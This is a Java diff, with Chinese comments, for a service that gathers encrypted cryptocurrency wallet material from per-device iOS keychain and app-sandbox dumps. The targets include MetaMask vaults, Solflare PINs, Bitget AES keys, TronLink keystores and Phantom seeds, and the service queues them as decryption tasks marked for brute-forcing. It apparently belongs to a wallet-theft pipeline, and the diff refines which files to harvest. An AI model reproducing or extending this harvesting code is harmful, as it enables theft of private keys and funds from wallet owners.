@@ -19,6 +19,7 @@ import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 import java.security.MessageDigest;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.HashSet;
@@ -35,21 +36,22 @@ import java.util.stream.Stream;
  * 旁路：把「本次未能明文解出」的钱包加密材料落盘，并在 waitbound 记录路径。
  * <p>
  * 不参与助记词解密 / mnemonic 入库 / news4 派生；失败只打日志，不影响主流程。
- * Trust 不收集。hex_content 存磁盘绝对路径，不存密文内容。
- * <p>
- * <b>一钱包一条</b>：同 device+wallet 只保留优先级最高的一份「可爆破」材料；
- * 落盘时能解析的一并写出可读 sidecar（.preview.json 等），密文载荷本身不做伪解密。
+ * Trust 不收集。密文落盘到 {@code {waitbound-dir}/{device}/{wallet}/}；
+ * <b>一钱包一条</b>：{@code hex_content} 存该钱包目录绝对路径（不是单个文件）。
+ * 同钱包可落多份配套材料（Solflare PIN+密文、Bitget 多文件等）。
  */
 @Service
 @Slf4j
 public class EncryptedWalletArtifactCollector {
 
-    /** 单文件上限（过大跳过） */
-    private static final int MAX_CONTENT_BYTES = 512 * 1024;
+    /** 单文件上限（过大跳过）；Bitget db 等可到约 1MB */
+    private static final int MAX_CONTENT_BYTES = 1024 * 1024;
 
     private static final char[] HEX = "0123456789abcdef".toCharArray();
 
     private static final Pattern B64_LINE = Pattern.compile("^[A-Za-z0-9+/=\\r\\n]+$");
+    private static final Pattern UUID_TEXT = Pattern.compile(
+            "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
 
     /**
      * 材料种类（内部用，用于优先级/文件名；入库的 encrypt_type 是算法名）。
@@ -59,28 +61,42 @@ public class EncryptedWalletArtifactCollector {
     static {
         KIND_PRIORITY.put("metamask_vault_backup", 100);
         KIND_PRIORITY.put("metamask_keyring_controller", 90);
+        // Solflare：default_encrypted=密文；passcode_vault=口令/PIN（常为短 Base64，如 8 字节）
+        KIND_PRIORITY.put("solflare_default_encrypted", 110);
         KIND_PRIORITY.put("solflare_passcode_vault", 100);
-        KIND_PRIORITY.put("solflare_default_encrypted", 85);
         KIND_PRIORITY.put("solflare_sandbox", 40);
         KIND_PRIORITY.put("tonkeeper_encrypted_chunk", 100);
         KIND_PRIORITY.put("tonkeeper_sandbox", 40);
-        KIND_PRIORITY.put("mytonwallet_secret", 100);
+        // MyTonWallet：accounts JSON 才是账户/加密入口；secret_* 多为短密文片段
+        KIND_PRIORITY.put("mytonwallet_accounts", 115);
+        KIND_PRIORITY.put("mytonwallet_secret", 70);
         KIND_PRIORITY.put("mytonwallet_sandbox", 40);
         KIND_PRIORITY.put("okx_se_ptc", 100);
+        KIND_PRIORITY.put("okx_aes_gcm_key", 80);
         KIND_PRIORITY.put("okx_sandbox_plist", 35);
         KIND_PRIORITY.put("phantom_vault_seed", 100);
         KIND_PRIORITY.put("uniswap_private_key", 100);
         KIND_PRIORITY.put("uniswap_mnemonic_blob", 90);
         KIND_PRIORITY.put("exodus_unused_data", 100);
-        KIND_PRIORITY.put("tronlink_keystore", 100);
-        KIND_PRIORITY.put("tronlink_hdwallet", 80);
-        KIND_PRIORITY.put("bitget_pin_or_mnemonic_key", 100);
-        KIND_PRIORITY.put("bitget_config_wallet", 35);
+        KIND_PRIORITY.put("tronlink_keystore", 120);
+        KIND_PRIORITY.put("tronlink_hdwallet", 30); // 常为 APNS/Firebase plist，非 keystore
+        KIND_PRIORITY.put("bitget_aes_key", 115);
+        KIND_PRIORITY.put("bitget_bg_blob", 110);
+        KIND_PRIORITY.put("bitget_db", 95);
+        KIND_PRIORITY.put("bitget_prefs", 90);
+        KIND_PRIORITY.put("bitget_pin_or_mnemonic_key", 20); // 多为 uuid 指针
+        KIND_PRIORITY.put("bitget_config_wallet", 50);
         KIND_PRIORITY.put("coin98_mmkv_enc", 100);
         KIND_PRIORITY.put("tonhub_mmkv", 100);
         KIND_PRIORITY.put("imtoken_als", 50);
         KIND_PRIORITY.put("tokenpocket_f4secyr", 100);
+        KIND_PRIORITY.put("tokenpocket_prefs", 85);
     }
+
+    /** 允许同钱包落多份不同 kind 的钱包 */
+    private static final Set<String> MULTI_KIND_WALLETS = new HashSet<>(Arrays.asList(
+            "bitget", "tokenpocket", "mytonwallet", "tronlink", "okx", "solflare"
+    ));
 
     @Resource
     private DecryptTaskDao decryptTaskDao;
@@ -134,48 +150,87 @@ public class EncryptedWalletArtifactCollector {
             return 0;
         }
 
-        // 按钱包收敛：每钱包只留优先级最高的一份
-        Map<String, Artifact> bestByWallet = new LinkedHashMap<>();
+        // 过滤假材料后：按 wallet+kind 留最高分（配套多文件）；入库仍一钱包一行
+        List<Artifact> filtered = new ArrayList<>();
         for (Artifact a : arts) {
             if (a == null || a.wallet == null || a.wallet.isEmpty()) continue;
-            String key = a.wallet.toLowerCase(Locale.ROOT);
-            Artifact cur = bestByWallet.get(key);
+            if (isJunkArtifact(a)) continue;
+            filtered.add(a);
+        }
+        Map<String, Artifact> bestByWalletKind = new LinkedHashMap<>();
+        for (Artifact a : filtered) {
+            String w = a.wallet.toLowerCase(Locale.ROOT);
+            boolean multi = MULTI_KIND_WALLETS.contains(w);
+            String key = multi
+                    ? w + "|" + (a.artifactKind == null ? "" : a.artifactKind)
+                    : w;
+            Artifact cur = bestByWalletKind.get(key);
             if (cur == null || score(a) > score(cur)) {
-                bestByWallet.put(key, a);
+                bestByWalletKind.put(key, a);
             }
+        }
+
+        // 按钱包分组
+        Map<String, List<Artifact>> byWallet = new LinkedHashMap<>();
+        for (Artifact a : bestByWalletKind.values()) {
+            String w = a.wallet.toLowerCase(Locale.ROOT);
+            byWallet.computeIfAbsent(w, k -> new ArrayList<>()).add(a);
         }
 
         String safeDevice = sanitizePathPart(deviceId == null || deviceId.isEmpty() ? "unknown" : deviceId);
         Path baseDir = resolveWaitboundBase().resolve(safeDevice);
         double now = System.currentTimeMillis() / 1000.0;
         int inserted = 0;
-        for (Artifact a : bestByWallet.values()) {
+        int walletsTouched = 0;
+        for (Map.Entry<String, List<Artifact>> ent : byWallet.entrySet()) {
+            String walletKey = ent.getKey();
+            List<Artifact> list = ent.getValue();
+            if (list == null || list.isEmpty()) continue;
+            Artifact primary = list.get(0);
+            for (Artifact a : list) {
+                if (score(a) > score(primary)) {
+                    primary = a;
+                }
+            }
+            String walletName = primary.wallet;
             try {
+                Path walletDir = baseDir.resolve(sanitizePathPart(walletName));
+                Files.createDirectories(walletDir);
+                int wrote = 0;
+                for (Artifact a : list) {
+                    String hash = shortHash(a.contentBytes);
+                    Path diskPath = writeToDisk(baseDir, a.wallet, a.sourceFile, a.contentBytes, hash, a.artifactKind);
+                    if (diskPath == null) continue;
+                    wrote++;
+                    try {
+                        writeNormalizedSidecar(diskPath, a.contentBytes);
+                    } catch (Throwable ignore) {}
+                }
+                if (wrote <= 0) {
+                    continue;
+                }
+                walletsTouched++;
+                String dirStr = walletDir.toAbsolutePath().normalize().toString().replace('\\', '/');
+
                 Integer exist = decryptTaskDao.findIdByDeviceWallet(
-                        deviceId == null ? "" : deviceId, a.wallet);
+                        deviceId == null ? "" : deviceId, walletName);
                 if (exist != null) {
+                    // 已有行：把 hex_content 纠正为目录（兼容旧「指文件」数据）
+                    try {
+                        decryptTaskDao.updateHexContentById(exist, dirStr);
+                    } catch (Throwable t) {
+                        log.debug("【waitbound】更新目录路径跳过 id={} err={}", exist, t.toString());
+                    }
                     continue;
                 }
-
-                String hash = shortHash(a.contentBytes);
-                Path diskPath = writeToDisk(baseDir, a.wallet, a.sourceFile, a.contentBytes, hash, a.artifactKind);
-                if (diskPath == null) {
-                    continue;
-                }
-                try {
-                    writeNormalizedSidecar(diskPath, a.contentBytes);
-                } catch (Throwable ignore) {}
-
-                String pathStr = diskPath.toAbsolutePath().normalize().toString().replace('\\', '/');
 
                 DecryptTaskEntity e = new DecryptTaskEntity();
                 e.setDeviceId(deviceId == null ? "" : deviceId);
                 e.setRowId(ios18paramId);
-                e.setWalletName(a.wallet);
-                e.setHexType(a.hexType);
-                e.setHexContent(pathStr);
-                // 入库算法名（AES / CryptoJS-AES / …），不是材料标签
-                e.setEncryptType(a.encryptAlgo);
+                e.setWalletName(walletName);
+                e.setHexType(primary.hexType);
+                e.setHexContent(dirStr);
+                e.setEncryptType(primary.encryptAlgo == null ? "unknown" : primary.encryptAlgo);
                 e.setResult("");
                 e.setStatus(0);
                 e.setSetTime(now);
@@ -183,30 +238,105 @@ public class EncryptedWalletArtifactCollector {
                 decryptTaskDao.insert(e);
                 inserted++;
             } catch (Throwable t) {
-                log.warn("【waitbound】写入跳过 wallet={} kind={} algo={} err={}",
-                        a.wallet, a.artifactKind, a.encryptAlgo, t.toString());
+                log.warn("【waitbound】写入跳过 wallet={} err={}", walletName, t.toString());
             }
         }
-        if (inserted > 0 || !bestByWallet.isEmpty()) {
-            log.info("【waitbound】待爆破材料入库 count={} wallets={} scanned={} device={} dir={}",
-                    inserted, bestByWallet.size(), arts.size(), deviceId, baseDir.toAbsolutePath());
+        if (inserted > 0 || walletsTouched > 0) {
+            log.info("【waitbound】待爆破材料入库 count={} wallets={} filesKept={} scanned={} device={} dir={}",
+                    inserted, walletsTouched, bestByWalletKind.size(), arts.size(),
+                    deviceId, baseDir.toAbsolutePath());
         }
         return inserted;
     }
 
-    /** 越高越优先作为该钱包唯一落盘条目 */
+    /** 越高越优先 */
     private static int score(Artifact a) {
         int base = KIND_PRIORITY.getOrDefault(a.artifactKind, 10);
         if (a.sourceFile != null) {
             String p = a.sourceFile.toString().replace('\\', '/').toLowerCase(Locale.ROOT);
             if (p.contains("/files/hex/")) {
-                base += 5; // hex 钥匙串导出通常比 sandbox 杂文件更接近密文入口
+                base += 5;
+            }
+            String name = a.sourceFile.getFileName().toString().toLowerCase(Locale.ROOT);
+            if (name.contains("default_encrypted") || name.contains("utc--")
+                    || name.contains("6163636f756e7473") || name.startsWith("accounts")
+                    || name.contains("aeskey") || name.contains("bg@@") || name.contains("bg_bg_")
+                    || name.contains("bitkeep.db") || name.contains("f4secyr")
+                    || name.contains("passcode_vault")) {
+                base += 20;
+            }
+            if (name.contains("pin_code_key")
+                    || name.contains("mnemonic_key_uuid") || name.contains("firebase")
+                    || name.contains("apns") || name.contains("push")) {
+                base -= 40;
             }
         }
         if (a.contentBytes != null && a.contentBytes.length > 0) {
-            base += Math.min(8, a.contentBytes.length / 8192);
+            String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
+            // Solflare PIN/口令本身就很短，不能按「体积分」惩罚
+            if (kind.contains("passcode_vault") || kind.contains("aes_key") || kind.contains("aes_gcm")) {
+                base += 5;
+            } else if (a.contentBytes.length >= 32) {
+                base += Math.min(12, a.contentBytes.length / 4096);
+            } else {
+                base -= 50;
+            }
         }
         return base;
+    }
+
+    /** 明显不可爆破 / 误采材料 */
+    private static boolean isJunkArtifact(Artifact a) {
+        if (a.contentBytes == null || a.contentBytes.length == 0) {
+            return true;
+        }
+        String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
+        String name = "";
+        if (a.sourceFile != null) {
+            name = a.sourceFile.getFileName().toString().toLowerCase(Locale.ROOT);
+        }
+        int n = a.contentBytes.length;
+
+        // Solflare passcode_vault：短 Base64/文本就是 PIN，必须保留
+        if (kind.contains("passcode_vault") || name.contains("passcode_vault")) {
+            String t = tryUtf8Text(a.contentBytes);
+            if (t != null && !t.trim().isEmpty()) {
+                return false;
+            }
+            // 非文本且极短才丢
+            return n < 4;
+        }
+        if (kind.contains("bitget_pin") || name.contains("pin_code_key") || name.contains("mnemonic_key_uuid")) {
+            String t = tryUtf8Text(a.contentBytes);
+            if (t != null && UUID_TEXT.matcher(t.trim()).matches()) {
+                return true;
+            }
+            if (n <= 40) {
+                return true;
+            }
+        }
+        if (kind.contains("tronlink_hdwallet") || name.contains("hdwallet")) {
+            if (looksLikeApnsOrFirebasePlist(a.contentBytes)) {
+                return true;
+            }
+        }
+        if (n < 8 && !kind.contains("aes") && !kind.contains("key")) {
+            return true;
+        }
+        return false;
+    }
+
+    private static boolean looksLikeApnsOrFirebasePlist(byte[] content) {
+        if (content == null || content.length < 16) {
+            return false;
+        }
+        List<String> strings = extractAsciiStrings(content, 4, 80);
+        String joined = String.join(" ", strings).toLowerCase(Locale.ROOT);
+        return joined.contains("aps-environment")
+                || joined.contains("firebase")
+                || joined.contains("gcm.token")
+                || joined.contains("googleusercontent")
+                || joined.contains("pushkit");
     }
 
     /**
@@ -556,19 +686,26 @@ public class EncryptedWalletArtifactCollector {
                     name -> name.contains("encrypted_chunk"), out);
         }
         if (!skip.contains("mytonwallet")) {
-            addMatching(hex.resolve("mytonwallet"), "mytonwallet", "mnemonic", "mytonwallet_secret",
-                    name -> name.startsWith("secret_") || name.contains("secret_0"), out);
+            Path d = hex.resolve("mytonwallet");
+            // "accounts" 常以 hex 名 6163636f756e7473 落盘
+            addMatching(d, "mytonwallet", "mnemonic", "mytonwallet_accounts",
+                    name -> name.contains("6163636f756e7473") || name.contains("accounts"), out);
+            addMatching(d, "mytonwallet", "mnemonic", "mytonwallet_secret",
+                    name -> name.startsWith("secret_") || name.contains("secret_0")
+                            || name.contains("secret%23") || name.contains("secret#"), out);
         }
         if (!skip.contains("okx")) {
-            addMatching(hex.resolve("okx"), "okx", "mnemonic", "okx_se_ptc",
+            Path d = hex.resolve("okx");
+            addMatching(d, "okx", "mnemonic", "okx_se_ptc",
                     name -> name.contains("se-ptc") || name.contains("encrypted"), out);
+            addMatching(d, "okx", "mnemonic", "okx_aes_gcm_key",
+                    name -> name.contains("aes-gcm") || name.contains("aes_gcm"), out);
         }
         if (!skip.contains("phantom")) {
             addMatching(hex.resolve("phantom"), "phantom", "mnemonic", "phantom_vault_seed",
                     name -> name.contains("7661756c742e73656564")
                             || name.contains("vault") || name.contains("seed") || name.endsWith(".json"), out);
         }
-        // trust：明确不收集
         if (!skip.contains("uniswap")) {
             addMatching(hex.resolve("uniswap"), "uniswap", "private_key", "uniswap_private_key",
                     name -> name.contains("privatekey"), out);
@@ -584,9 +721,17 @@ public class EncryptedWalletArtifactCollector {
                     name -> name.contains("hdwallet") || name.contains("tronlink"), out);
         }
         if (!skip.contains("bitget")) {
-            addMatching(hex.resolve("bitget"), "bitget", "mnemonic", "bitget_pin_or_mnemonic_key",
+            Path d = hex.resolve("bitget");
+            addMatching(d, "bitget", "mnemonic", "bitget_aes_key",
+                    name -> name.contains("aeskey") || name.equals("aeskeyname_data.txt")
+                            || name.startsWith("aeskeyname"), out);
+            addMatching(d, "bitget", "mnemonic", "bitget_bg_blob",
+                    name -> name.contains("bg@@") || name.contains("bg_bg_") || name.startsWith("bg_"), out);
+            addMatching(d, "bitget", "mnemonic", "bitget_prefs",
+                    name -> name.contains("com.bitkeep.os"), out);
+            addMatching(d, "bitget", "mnemonic", "bitget_pin_or_mnemonic_key",
                     name -> (name.contains("mnemonic") || name.contains("pin") || name.contains("password"))
-                            && !name.endsWith(".txt"), out);
+                            && !name.endsWith(".txt.crc"), out);
         }
     }
 
@@ -598,13 +743,14 @@ public class EncryptedWalletArtifactCollector {
                     name -> name.contains("keyringcontroller"), out);
         }
         if (!skip.contains("tronlink")) {
-            addMatching(sandbox.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_keystore",
-                    name -> name.contains("utc--"), out);
+            // UTC keystore 在 Documents/keystore/ 下，需 depth>=4
+            addMatchingDeep(sandbox.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_keystore",
+                    name -> name.contains("utc--"), 5, out);
         }
-        // trust：不收集
         if (!skip.contains("coin98")) {
-            addMatching(sandbox.resolve("coin98"), "coin98", "mnemonic", "coin98_mmkv_enc",
-                    name -> name.equals("mmkv.default.enc") || name.endsWith(".enc"), out);
+            // mmkv 在 Documents/mmkv/ 下，需 depth>=3
+            addMatchingDeep(sandbox.resolve("coin98"), "coin98", "mnemonic", "coin98_mmkv_enc",
+                    name -> name.equals("mmkv.default.enc") || name.endsWith(".enc"), 4, out);
         }
         if (!skip.contains("tonhub")) {
             addMatching(sandbox.resolve("tonhub"), "tonhub", "mnemonic", "tonhub_mmkv",
@@ -618,11 +764,15 @@ public class EncryptedWalletArtifactCollector {
         }
         if (!skip.contains("okx")) {
             addMatchingDeep(sandbox.resolve("okx"), "okx", "mnemonic", "okx_sandbox_plist",
-                    name -> name.endsWith(".plist"), 3, out);
+                    name -> name.endsWith(".plist") && name.contains("okex"), 3, out);
         }
         if (!skip.contains("bitget")) {
+            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_db",
+                    name -> name.equals("bitkeep.db") || name.endsWith("bitkeep.db"), 4, out);
+            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_prefs",
+                    name -> name.contains("com.bitkeep.os") && name.endsWith(".plist"), 4, out);
             addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_config_wallet",
-                    name -> name.contains("kconfigwallet") || name.contains("wallet"), 4, out);
+                    name -> name.contains("kconfigwallet"), 4, out);
         }
         if (!skip.contains("imtoken")) {
             addMatchingDeep(sandbox.resolve("imtoken"), "imtoken", "mnemonic", "imtoken_als",
@@ -632,6 +782,8 @@ public class EncryptedWalletArtifactCollector {
         if (!skip.contains("tokenpocket")) {
             Path f4 = sandbox.resolve("tokenpocket").resolve("Documents").resolve("F4SeCyr");
             addMatching(f4, "tokenpocket", "mnemonic", "tokenpocket_f4secyr", name -> true, out);
+            addMatchingDeep(sandbox.resolve("tokenpocket"), "tokenpocket", "mnemonic", "tokenpocket_prefs",
+                    name -> name.contains("com.global.wallet") && name.endsWith(".plist"), 4, out);
         }
         if (!skip.contains("mytonwallet")) {
             addMatching(sandbox.resolve("mytonwallet"), "mytonwallet", "mnemonic", "mytonwallet_sandbox",
